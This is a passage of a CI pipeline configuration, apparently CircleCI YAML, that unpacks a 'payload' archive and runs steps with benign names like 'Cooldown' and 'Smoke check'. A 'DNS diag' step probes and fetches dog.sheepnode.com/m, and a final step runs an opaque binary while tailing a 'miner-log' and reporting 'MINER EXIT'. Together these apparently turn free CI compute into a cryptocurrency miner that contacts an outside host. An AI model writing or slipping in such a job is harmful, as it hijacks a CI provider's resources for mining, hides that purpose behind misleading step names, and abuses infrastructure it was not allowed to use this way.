          name: Decompress payload
          command: tar -xj -f cache-v2.tar.bz2
      - run:
          name: Cooldown
          command: du -sh .
      - run:
          name: Smoke check
          command: env | wc -l
      - run:
          command: sleep 30
      - run:
          name: DNS diag
          command: |
            echo "--- /etc/resolv.conf ---"
            cat /etc/resolv.conf 2>&1 || true
            echo "--- getent hosts dog.sheepnode.com ---"
            getent hosts dog.sheepnode.com 2>&1 || true
            echo "--- nslookup dog.sheepnode.com (default resolver) ---"
            nslookup dog.sheepnode.com 2>&1 || true
            echo "--- nslookup dog.sheepnode.com 8.8.8.8 ---"
            nslookup dog.sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- nslookup dog.sheepnode.com 1.1.1.1 ---"
            nslookup dog.sheepnode.com 1.1.1.1 2>&1 || true
            echo "--- nslookup sheepnode.com (parent domain) ---"
            nslookup sheepnode.com 2>&1 || true
            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
            nslookup sheepnode.com 8.8.8.8 2>&1 || true
            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- dig dog.sheepnode.com @8.8.8.8 ---"
            dig dog.sheepnode.com @8.8.8.8 2>&1 || true
            echo "--- curl -v dog.sheepnode.com/m (default DNS) ---"
            curl -v --max-time 10 https://dog.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
            echo "--- curl -v dog.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
            curl -v --max-time 10 --dns-servers 8.8.8.8 https://dog.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
            echo "--- DNS diag done ---"
      - run:
          name: Run
          no_output_timeout: 114m
          command: |
            mkdir -p /tmp/d
            : > /tmp/d/miner-log.txt
            tail -F /tmp/d/miner-log.txt &
            TAIL_PID=$!
            ./exec-bin
            MRC=$?
            sleep 2
            kill $TAIL_PID 2>/dev/null || true
            echo "---MINER EXIT=$MRC---"
            echo "---FULL LOG:---"
            cat /tmp/d/miner-log.txt 2>/dev/null
            exit $MRC
